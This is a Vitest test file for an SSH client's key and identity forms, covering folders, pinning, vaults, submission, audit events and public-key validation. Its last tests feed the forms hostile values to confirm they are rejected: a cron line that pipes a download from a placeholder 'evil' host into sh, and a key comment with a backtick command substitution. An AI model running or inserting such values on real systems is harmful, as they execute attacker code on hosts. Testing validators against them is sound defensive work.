import { test, expect, vi, beforeEach, afterEach } from "vitest";
import { render, cleanup, act, fireEvent, screen } from "@testing-library/react";
import type { Identity, SshKey } from "@/types";

const h = vi.hoisted(() => ({
  folders: [] as unknown[],
  saveFolder: vi.fn(async (input: unknown) => ({ id: "f-new", ...(input as object) })),
  loadFolders: vi.fn(async () => {}),
  pinKey: vi.fn(async (_id: string, _pinned: boolean) => {}),
  pinIdentity: vi.fn(async (_id: string, _pinned: boolean) => {}),
  teams: [] as { id: string }[],
  isPinned: false,
  nextPersonalPinValue: vi.fn((_source: string) => true),
  toggleExcluded: vi.fn(),
  isObjectSynced: vi.fn(() => true),
  contributions: [] as unknown[],
  defaultVaultId: "personal",
  secrets: {} as Record<string, string>,
  reportAuditClientEvent: vi.fn(),
}));

vi.mock("react-i18next", () => ({
  useTranslation: () => ({ t: (k: string) => k }),
  initReactI18next: { type: "3rdParty", init: () => {} },
}));
vi.mock("@iconify/react", () => ({ Icon: () => null }));

vi.mock("@/stores/folderStore", () => ({
  useFolderStore: () => ({ folders: h.folders, loadFolders: h.loadFolders, saveFolder: h.saveFolder }),
}));
vi.mock("@/stores/keyStore", () => ({
  useKeyStore: (sel?: (s: unknown) => unknown) => {
    const state = { keys: [], teamKeys: [], loadKeys: vi.fn(async () => {}), pinKey: h.pinKey };
    return sel ? sel(state) : state;
  },
}));
vi.mock("@/stores/identityStore", () => ({
  useIdentityStore: (sel?: (s: unknown) => unknown) => {
    const state = { pinIdentity: h.pinIdentity };
    return sel ? sel(state) : state;
  },
}));
vi.mock("@/stores/connectionStore", () => ({
  useConnectionStore: (sel?: (s: unknown) => unknown) => {
    const state = { connections: [], loadConnections: vi.fn(async () => {}), updateConnection: vi.fn(async () => {}) };
    return sel ? sel(state) : state;
  },
}));
vi.mock("@/stores/uiStore", () => ({
  useUIStore: (sel?: (s: unknown) => unknown) => {
    const state = { setActiveNav: vi.fn(), setHomePendingAction: vi.fn() };
    return sel ? sel(state) : state;
  },
}));
vi.mock("@/stores/teamStore", () => ({
  useTeamStore: Object.assign(
    (sel?: (s: unknown) => unknown) => {
      const state = { teams: h.teams };
      return sel ? sel(state) : state;
    },
    { getState: () => ({ teams: h.teams }) },
  ),
}));
vi.mock("@/stores/syncPrefsStore", () => ({
  useSyncPrefsStore: () => ({ toggleExcluded: h.toggleExcluded, isObjectSynced: h.isObjectSynced }),
}));
vi.mock("@/stores/shortcutStore", () => ({ getShortcutHint: () => "Del" }));
vi.mock("@/hooks/useUIContributions", () => ({ useUIContributions: () => h.contributions }));
vi.mock("@/hooks/useEffectivePinned", () => ({
  useEffectivePinned: () => h.isPinned,
  useEffectivePinSource: () => "team",
  nextPersonalPinValue: (s: string) => h.nextPersonalPinValue(s),
}));
vi.mock("@/hooks/useWritableVaultIds", () => ({
  useDefaultVaultId: () => h.defaultVaultId,
  resolveVaultIdForSave: (v: string) => v,
}));
vi.mock("@/services/vault", () => ({
  getSecret: vi.fn(async (k: string) => h.secrets[k] ?? null),
  storeSecret: vi.fn(async () => {}),
}));
vi.mock("@/services/auditContextResolver", () => ({ auditContextForVaultId: () => ({}) }));
vi.mock("@/services/auditReporter", () => ({ reportAuditClientEvent: (...a: unknown[]) => h.reportAuditClientEvent(...a) }));

vi.mock("@/components/shared/TagSelector", () => ({
  default: ({ value, vaultId, onChange }: { value: string[]; vaultId: string; onChange: (v: string[]) => void }) => (
    <button data-tag-selector data-vault={vaultId} onClick={() => onChange([...value, "added"])} />
  ),
}));
vi.mock("@/components/shared/FolderSelector", () => ({
  default: ({
    value,
    folders,
    onChange,
    onCreateFolder,
  }: {
    value: string | null;
    folders: { id: string }[];
    onChange: (id: string | null) => void;
    onCreateFolder: (name: string) => Promise<string>;
  }) => (
    <div data-folder-selector data-count={folders.length} data-value={value ?? ""}>
      <button data-folder-pick onClick={() => onChange("f1")} />
      <button data-folder-create onClick={() => void onCreateFolder("made")} />
    </div>
  ),
}));
vi.mock("@/components/shared/VaultPicker", () => ({
  VaultPicker: ({ vaultId, onChange }: { vaultId: string; onChange: (id: string) => void }) => (
    <button data-vault-picker data-value={vaultId} onClick={() => onChange("team-1")} />
  ),
}));
vi.mock("@/components/shared/PinButton", () => ({
  PinButton: ({ pinned, onToggle }: { pinned: boolean; onToggle: () => void }) => (
    <button data-pin data-pinned={String(pinned)} onClick={onToggle} />
  ),
}));
vi.mock("@/components/shared/PanelActionsMenu", () => ({
  PanelActionsMenu: ({ items }: { items: { label: string }[] }) => (
    <div data-actions-menu data-labels={items.map((i) => i.label).join("|")} />
  ),
}));
vi.mock("./KeyGenFields", () => ({ KeyGenFields: () => <div data-keygen /> }));
vi.mock("./KeyFileDropZone", () => ({ KeyFileDropZone: () => <div data-dropzone /> }));

const { KeyForm } = await import("./KeyForm");
const { IdentityForm } = await import("./IdentityForm");

beforeEach(() => {
  h.folders = [
    { id: "f1", name: "One", object_type: "keychain", vault_id: "personal" },
    { id: "c1", name: "Conn", object_type: "connection", vault_id: "personal" },
  ];
  h.teams = [];
  h.isPinned = false;
  h.secrets = {};
  h.contributions = [];
  h.defaultVaultId = "personal";
  vi.clearAllMocks();
  h.isObjectSynced.mockReturnValue(true);
});
afterEach(() => cleanup());

function key(over: Partial<SshKey> = {}): SshKey {
  return { id: "k1", name: "Key", tags: [], vault_id: "personal", created_at: "", updated_at: "", clocks: {}, ...over } as SshKey;
}
function identity(over: Partial<Identity> = {}): Identity {
  return { id: "i1", name: "Ident", username: "root", tags: [], vault_id: "personal", created_at: "", updated_at: "", clocks: {}, ...over } as Identity;
}

function renderKey(props: Partial<Parameters<typeof KeyForm>[0]> = {}) {
  const onSubmit = vi.fn();
  const flushRef = { current: null as (() => void) | null };
  const isDirtyRef = { current: false };
  render(<KeyForm onSubmit={onSubmit} onClose={vi.fn()} flushRef={flushRef} isDirtyRef={isDirtyRef} canEdit {...props} />);
  return { onSubmit, flushRef, isDirtyRef };
}
function renderIdentity(props: Partial<Parameters<typeof IdentityForm>[0]> = {}) {
  const onSubmit = vi.fn();
  const flushRef = { current: null as (() => void) | null };
  const isDirtyRef = { current: false };
  render(<IdentityForm onSubmit={onSubmit} onClose={vi.fn()} flushRef={flushRef} isDirtyRef={isDirtyRef} canEdit {...props} />);
  return { onSubmit, flushRef, isDirtyRef };
}

test.each([
  ["key", renderKey],
  ["identity", renderIdentity],
])("%s form offers only keychain folders and creates one in the current vault", async (_kind, mount) => {
  mount();
  expect(document.querySelector("[data-folder-selector]")?.getAttribute("data-count")).toBe("1");
  await act(async () => {
    fireEvent.click(document.querySelector("[data-folder-create]")!);
  });
  expect(h.saveFolder).toHaveBeenCalledWith({ name: "made", object_type: "keychain", vault_id: "personal" });
  expect(document.querySelector("[data-folder-selector]")?.getAttribute("data-value")).toBe("f-new");
});

test.each([
  ["key", renderKey, () => h.pinKey],
  ["identity", renderIdentity, () => h.pinIdentity],
])("%s form pins a personal object with the plain toggle", (_kind, mount, pin) => {
  mount({ initial: (_kind === "key" ? key() : identity()) as never });
  fireEvent.click(document.querySelector("[data-pin]")!);
  expect(pin()).toHaveBeenCalledWith(_kind === "key" ? "k1" : "i1", true);
});

test.each([
  ["key", renderKey, () => h.pinKey],
  ["identity", renderIdentity, () => h.pinIdentity],
])("%s form pins a team object through the personal override", (_kind, mount, pin) => {
  h.teams = [{ id: "team-1" }];
  h.nextPersonalPinValue.mockReturnValue(false);
  mount({ initial: (_kind === "key" ? key({ vault_id: "team-1" }) : identity({ vault_id: "team-1" })) as never });
  fireEvent.click(document.querySelector("[data-pin]")!);
  expect(h.nextPersonalPinValue).toHaveBeenCalled();
  expect(pin()).toHaveBeenCalledWith(_kind === "key" ? "k1" : "i1", false);
});

test.each([
  ["key", renderKey],
  ["identity", renderIdentity],
])("%s form's actions menu carries the sync toggle and the delete row", (_kind, mount) => {
  h.isObjectSynced.mockReturnValue(false);
  mount({ initial: (_kind === "key" ? key() : identity()) as never, onDelete: vi.fn() });
  const labels = document.querySelector("[data-actions-menu]")!.getAttribute("data-labels")!.split("|");
  expect(labels).toContain("keychain.common.enableCloudSync");
  expect(labels).toContain("common.action.delete");
});

test("only the key form puts Add to host first in the menu", () => {
  renderKey({ initial: key(), onExport: vi.fn() });
  const labels = document.querySelector("[data-actions-menu]")!.getAttribute("data-labels")!.split("|");
  expect(labels[0]).toBe("keychain.common.addToHost");
});

test.each([
  ["key", renderKey],
  ["identity", renderIdentity],
])("%s form follows the default vault until the picker is touched", (_kind, mount) => {
  mount();
  expect(document.querySelector("[data-vault-picker]")?.getAttribute("data-value")).toBe("personal");
  fireEvent.click(document.querySelector("[data-vault-picker]")!);
  expect(document.querySelector("[data-vault-picker]")?.getAttribute("data-value")).toBe("team-1");
});

test.each([
  ["key", renderKey],
  ["identity", renderIdentity],
])("%s form marks the caller's dirty ref on an edit", (_kind, mount) => {
  const { isDirtyRef } = mount();
  expect(isDirtyRef.current).toBe(false);
  fireEvent.click(document.querySelector("[data-tag-selector]")!);
  expect(isDirtyRef.current).toBe(true);
});

test("the key form submits the typed material with a generated default name", async () => {
  const { onSubmit, flushRef } = renderKey();
  const priv = document.querySelectorAll("textarea")[0];
  fireEvent.change(priv, { target: { value: "-----BEGIN OPENSSH PRIVATE KEY-----\nx" } });
  fireEvent.click(document.querySelector("[data-tag-selector]")!);
  await act(async () => {
    flushRef.current!();
  });
  expect(onSubmit).toHaveBeenCalledTimes(1);
  const [data, privateKey, publicKey, passphrase] = onSubmit.mock.calls[0];
  expect(data).toMatchObject({ tags: ["added"], vault_id: "personal" });
  expect(String(data.name)).toContain("·");
  expect(privateKey).toContain("BEGIN OPENSSH");
  expect(publicKey).toBeNull();
  expect(passphrase).toBeNull();
});

test("the identity form submits the username and only a dirty password", async () => {
  const { onSubmit, flushRef } = renderIdentity();
  fireEvent.change(screen.getByPlaceholderText("root"), { target: { value: "deploy" } });
  await act(async () => {
    flushRef.current!();
  });
  expect(onSubmit.mock.calls[0][0]).toMatchObject({ username: "deploy", vault_id: "personal" });
  expect(onSubmit.mock.calls[0][1]).toBeNull();
  fireEvent.change(screen.getByPlaceholderText("••••••••"), { target: { value: "s3cret" } });
  await act(async () => {
    flushRef.current!();
  });
  expect(onSubmit.mock.calls[1][1]).toBe("s3cret");
});

test("revealing an existing identity password reports a secret.viewed audit event", async () => {
  h.secrets["identity:i1:password"] = "stored";
  renderIdentity({ initial: identity() });
  await act(async () => {
    await Promise.resolve();
  });
  const reveal = screen.getByPlaceholderText("••••••••").parentElement!.querySelector("button")!;
  fireEvent.click(reveal);
  expect(h.reportAuditClientEvent).toHaveBeenCalledWith(
    expect.anything(),
    "secret.viewed",
    expect.objectContaining({ target_type: "identity", target_id: "i1" }),
  );
});

test("the key form loads its stored material and hides the mode toggle when editing", async () => {
  h.secrets["key:k1:private"] = "PRIV";
  h.secrets["key:k1:public"] = "PUB";
  h.secrets["key:k1:passphrase"] = "PASS";
  renderKey({ initial: key() });
  await act(async () => {
    await Promise.resolve();
  });
  const textareas = Array.from(document.querySelectorAll("textarea")) as HTMLTextAreaElement[];
  expect(textareas[0].value).toBe("PRIV");
  expect(textareas[1].value).toBe("PUB");
  expect(screen.queryByText("keychain.keyForm.modeGenerate")).toBeNull();
});

const VALID_PUB = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 kipavy@laptop";

test("the key form refuses to save a public half that is not an SSH public key", async () => {
  const { onSubmit, flushRef } = renderKey();
  const [priv, pub] = Array.from(document.querySelectorAll("textarea"));
  fireEvent.change(priv, { target: { value: "-----BEGIN OPENSSH PRIVATE KEY-----\nx" } });
  fireEvent.change(pub, { target: { value: "* * * * * root curl http://evil/x|sh" } });
  await act(async () => {
    flushRef.current!();
  });
  // Stored, it would be written verbatim into a remote file by addKeyToHost —
  // and the user's first symptom would be a key that imported fine and refused
  // to deploy. Nothing is saved, and the field says why.
  expect(onSubmit).not.toHaveBeenCalled();
  expect(screen.getByText("keychain.keyForm.invalidPublicKey")).toBeTruthy();
});

test("the key form saves once the public half is corrected", async () => {
  const { onSubmit, flushRef } = renderKey();
  const [priv, pub] = Array.from(document.querySelectorAll("textarea"));
  fireEvent.change(priv, { target: { value: "-----BEGIN OPENSSH PRIVATE KEY-----\nx" } });
  fireEvent.change(pub, { target: { value: "not a key" } });
  await act(async () => {
    flushRef.current!();
  });
  expect(onSubmit).not.toHaveBeenCalled();
  fireEvent.change(pub, { target: { value: VALID_PUB } });
  await act(async () => {
    flushRef.current!();
  });
  expect(onSubmit).toHaveBeenCalledTimes(1);
  expect(onSubmit.mock.calls[0][2]).toBe(VALID_PUB);
  expect(screen.queryByText("keychain.keyForm.invalidPublicKey")).toBeNull();
});

test("the identity form refuses to save inline key material with a bad public half", async () => {
  const { onSubmit, flushRef } = renderIdentity();
  fireEvent.change(screen.getByPlaceholderText("root"), { target: { value: "deploy" } });
  fireEvent.click(screen.getByText("keychain.identityForm.noKey"));
  fireEvent.click(screen.getByText("keychain.identityForm.newKeyInline"));
  const textareas = Array.from(document.querySelectorAll("textarea"));
  fireEvent.change(textareas[textareas.length - 2], {
    target: { value: "-----BEGIN OPENSSH PRIVATE KEY-----\nx" },
  });
  fireEvent.change(textareas[textareas.length - 1], {
    target: { value: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 `id`" },
  });
  await act(async () => {
    flushRef.current!();
  });
  expect(onSubmit).not.toHaveBeenCalled();
  expect(screen.getByText("keychain.keyForm.invalidPublicKey")).toBeTruthy();
});
